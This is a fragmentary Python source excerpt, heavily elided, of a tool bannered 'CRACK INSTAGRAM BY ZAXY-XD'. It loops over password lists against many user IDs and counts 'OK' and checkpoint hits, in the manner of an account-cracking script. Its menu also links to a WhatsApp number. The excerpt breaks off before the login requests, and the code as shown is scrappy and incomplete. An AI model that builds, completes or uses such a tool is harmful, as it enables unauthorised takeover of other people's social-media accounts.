...
\t─║║║║║─║║║║║║║─║║║║╚╗║╠══╗║─║║─║╚═╝║
\t╔╝╚╝║╚═╝║║║║║║╔╣╠╣║─║║║╚═╝║─║║─║╔═╗║
\t╚═══╩═══╩╝╚╝╚╝╚══╩╝─╚═╩═══╝─╚╝─╚╝─╚╝\n\t{P2}        CRACK INSTAGRAM BY ZAXY-XD""",title=f"{P2}{H2}{self.timeLine()}",width=80,padding=(0,4),style=f"{color_table}"))
    ...
    def menu(self):
     ...
     #   os.popen('data/play-audio/menu.mp3')
        ...
        if pil in ["", " "]:
            ...
            try:
                os.system("xdg-open https://wa.me/+6283850999591")
                time.sleep(2);exit()
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                print(f" {H}•{N} {M}Koneksi Internet Anda Bermasalah")
                exit()
    ...
    def lains(self):
        ...
        if ask in ["",""]:
           ...
           time.sleep(2);self.menu()
            ...
            prints(Panel(f"{P2}Jumlah Pengguna Script Private {color_rich}{self.Rayan}{P2} Orang",width=80,padding=(0,15),style=f"{color_table}"))
            time.sleep(3)
...
{N}[{H}+{N}] {H}•• LIVE ••{N}
 ...
 {N}├╴>{N} following : {H}{ful}{N}
    ...
    def crackXC(self, user, pasw):
        prog.update(des,description=f"[{H2} zaxxy-xd {P2}] ( {H2}stabil{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
        prog.advance(des)
        for password in pasw:
              try:
                    with requests.Session() as ses:
